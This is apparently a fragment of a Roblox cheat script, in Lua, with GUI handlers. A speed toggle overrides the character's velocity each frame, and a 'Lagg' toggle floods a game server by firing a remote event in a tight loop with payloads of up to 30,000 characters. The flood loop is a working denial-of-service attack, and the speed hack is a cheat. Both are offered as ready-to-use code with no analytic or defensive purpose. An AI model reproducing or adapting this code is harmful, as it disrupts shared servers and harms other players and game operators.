local function updateUI(val)
    local realPower = math.clamp(math.floor(val * 2),1,200)
    packetLabel.Text = "Packets: "..(realPower * 1800)
end

powerBox.FocusLost:Connect(function()
    local v = tonumber(powerBox.Text) or 40
    v = math.clamp(v,1,100)
    powerBox.Text = tostring(v)
    power = v * 2
    updateUI(v)
end)

speedBox.FocusLost:Connect(function()
    local value = tonumber(speedBox.Text)
    if value and value > 0 then
        SPEED = value
    else
        speedBox.Text = tostring(SPEED)
    end
end)

local function enableSpeed()
    if speedConn then return end
    speedConn = RunService.Heartbeat:Connect(function()
        local dir = Humanoid.MoveDirection
        if dir.Magnitude > 0 then
            HRP.AssemblyLinearVelocity = dir * SPEED + Vector3.new(0, HRP.AssemblyLinearVelocity.Y, 0)
        end
    end)
end

local function disableSpeed()
    if speedConn then
        speedConn:Disconnect()
        speedConn = nil
    end
end

speedBtn.MouseButton1Click:Connect(function()
    isSpeedOn = not isSpeedOn
    speedBtn.Text = "Speed: "..(isSpeedOn and "ON" or "OFF")
    if isSpeedOn then
        enableSpeed()
    else
        disableSpeed()
    end
end)

local function toggleLag()
    isLagging = not isLagging
    laggBtn.Text = "Lagg: "..(isLagging and "ON" or "OFF")

    if isLagging then
        fireLoop = task.spawn(function()
            while isLagging do
                local realPower = math.clamp(math.floor(power),1,200)
                local payload = string.rep("X", realPower * 150)
                local fireCount = math.max(1, math.floor(realPower / 50))

                for i = 1, fireCount do
                    pcall(function()
                        target:FireServer(uuid, payload)
                    end)
                end

                task.wait(0.035)
            end
        end)
    else
        if fireLoop then
            task.cancel(fireLoop)
            fireLoop = nil
        end
    end
end

laggBtn.MouseButton1Click:Connect(toggleLag)

